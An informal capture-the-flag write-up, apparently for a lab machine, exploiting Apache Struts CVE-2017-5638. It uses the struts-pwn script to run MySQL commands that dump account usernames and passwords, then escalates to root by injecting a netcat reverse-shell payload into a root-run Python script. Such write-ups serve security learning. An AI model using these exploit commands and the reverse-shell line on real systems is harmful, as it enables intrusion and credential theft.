we found a dir Monitoring and it had files with ==.action== extension which measn ==strut==

on searching https://www.csoonline.com/article/3444488/equifax-data-breach-faq-what-happened-who-was-affected-what-was-the-impact.html

we found this ==CVE== and and python script

https://github.com/mazen160/struts-pwn

it worked

for ==mysql==

```
$ python3 CVE-2017-5638ApacheStruts.py -u http://10.129.188.28/Monitoring/example/Welcome.action -c 'mysqlshow -uadmin -padmin'
$ python3 CVE-2017-5638ApacheStruts.py -u http://10.129.188.28/Monitoring/example/Welcome.action -c 'mysqlshow -uadmin -padmin users'

$ python3 CVE-2017-5638ApacheStruts.py -u http://10.129.188.28/Monitoring/example/Welcome.action -c 'mysqlshow -uadmin -padmin users accounts'

$ python3 CVE-2017-5638ApacheStruts.py -u http://10.129.188.28/Monitoring/example/Welcome.action -c 'mysql -uadmin -padmin -e "select username,password from accounts" users'
```

and we got content and a shell via ssh

now for root part

i saw a python file which was running as root

i injected payload but no connection as it was seen it as only connecting to ==internal== networks so

we had to write

`__import__("os").system("nc -e /bin/bash 127.0.0.1 12311")`

`and got shell`
